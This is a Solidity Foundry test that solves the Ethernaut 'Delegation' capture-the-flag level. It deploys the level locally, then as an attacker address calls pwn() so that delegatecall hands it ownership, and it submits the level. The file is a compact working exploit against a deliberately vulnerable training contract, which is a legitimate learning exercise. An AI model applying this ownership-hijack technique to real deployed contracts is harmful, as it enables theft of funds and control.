//SPDX-Lincense-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/Delegation/DelegationFactory.sol";

contract DelegationHack is DSTest {
    Vm vm = Vm(address(HEVM_ADDRESS)); 
  Ethernaut ethernaut;
  address attacker = address(0xbabe);

  function setUp() public {
    ethernaut = new Ethernaut(); 
    vm.deal(attacker, 1 ether); 
  }

  function testDelegationHack() public {
    //LEVEL SETUP
    DelegationFactory delegationFactory = new DelegationFactory();
    ethernaut.registerLevel(delegationFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(delegationFactory);
    Delegation delegationContract = Delegation(levelAddress);

    
    //LEVEL ATTACK
    (bool success, ) = address(delegationContract).call(abi.encodeWithSignature('pwn()'));
    require(success);
    assertEq(delegationContract.owner(), attacker);

    //LEVEL SUBMISSION

    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }






}